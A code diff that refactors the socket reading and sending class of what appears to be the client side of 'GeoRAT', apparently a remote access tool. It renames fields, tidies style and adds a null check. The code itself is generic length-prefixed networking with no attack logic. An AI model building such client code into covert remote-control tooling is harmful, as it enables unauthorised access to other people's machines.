@@ -10,13 +10,13 @@ namespace GeoRAT.Client.Network
         #region Declarations
         //delegates and events
 
-        public delegate void Received( byte[] buffer, int MessageSize);
+        public delegate void Received(byte[] buffer, int messageSize);
         public event Received OnReceived;
         public delegate void Disconnected(Socket s);
         public event Disconnected OnDisconnected;
         //fields and properties 
-        private Socket ClientReader;
-        private byte[] lenbuffer = new byte[4];
+        private readonly Socket _clientReader;
+        private readonly byte[] _lenbuffer = new byte[4];
 
         #endregion
 
@@ -24,14 +24,14 @@ namespace GeoRAT.Client.Network
 
         public DataReader(Socket s)
         {
-            ClientReader = s;
-            ClientReader.BeginReceive(new byte[] { 0 }, 0, 0, SocketFlags.None, ReceivedCallback, null);
+            _clientReader = s;
+            _clientReader.BeginReceive(new byte[] { 0 }, 0, 0, SocketFlags.None, ReceivedCallback, null);
         }
 
 
         #endregion
 
-    
+
         #region ReceiveCallback
         //Begin reading data from server here 
 
@@ -39,22 +39,22 @@ namespace GeoRAT.Client.Network
         {
             try
             {
-                
-                int totalReceived = ClientReader.EndReceive(result);
-                int left = sizeof(int) - totalReceived; // How much bytes left to receive. 
+
+                var totalReceived = _clientReader.EndReceive(result);
+                var left = sizeof(int) - totalReceived; // How much bytes left to receive. 
                 do
                 {
-                    var recv =  ClientReader.Receive(lenbuffer, totalReceived, left, SocketFlags.None);
+                    var recv = _clientReader.Receive(_lenbuffer, totalReceived, left, SocketFlags.None);
                     left -= recv;
                 } while (left != 0);
-                var len = BitConverter.ToInt32(lenbuffer, 0); //Deserialize received bytes back to INT and get length of packet
+                var len = BitConverter.ToInt32(_lenbuffer, 0); //Deserialize received bytes back to INT and get length of packet
                 ReceiveMessage(len); //Begin reading incoming packets based on length now 
-                ClientReader.BeginReceive(new byte[] { 0 }, 0, 0, SocketFlags.None, ReceivedCallback, null);
+                _clientReader.BeginReceive(new byte[] { 0 }, 0, 0, SocketFlags.None, ReceivedCallback, null);
             }
             catch
             {
 
-                OnDisconnected?.Invoke(ClientReader);
+                OnDisconnected?.Invoke(_clientReader);
             }
         }
 
@@ -73,9 +73,10 @@ namespace GeoRAT.Client.Network
                 byte[] buffer = new byte[size];
                 do
                 {
-                    IAsyncResult result = ClientReader.BeginReceive(buffer, total, size, SocketFlags.None, null, null);
-                    result.AsyncWaitHandle.WaitOne(ClientReader.ReceiveTimeout);
-                    int received = ClientReader.EndReceive(result);
+                    var result = _clientReader.BeginReceive(buffer, total, size, SocketFlags.None, null, null);
+                    result?.AsyncWaitHandle.WaitOne(_clientReader.ReceiveTimeout);
+                    if (result == null) continue;
+                    var received = _clientReader.EndReceive(result);
                     total += received;
                     if (received == 0)
                         break;
@@ -86,31 +87,26 @@ namespace GeoRAT.Client.Network
             catch
             {
 
-                OnDisconnected?.Invoke(ClientReader);
+                OnDisconnected?.Invoke(_clientReader);
             }
         }
 
-
-
-
         #endregion
-
 
         #region Send
 
-        
         //Send data to server via this function 
         public void Send(byte[] buf)
         {
-            ClientReader.BeginSend(buf, 0, buf.Length, SocketFlags.None, SendCb, null);
+            _clientReader.BeginSend(buf, 0, buf.Length, SocketFlags.None, SendCb, null);
         }
 
         private void SendCb(IAsyncResult result)
         {
-            ClientReader.EndSend(result);
+            _clientReader.EndSend(result);
         }
-        
+
     }
-#endregion
+    #endregion
 
 }
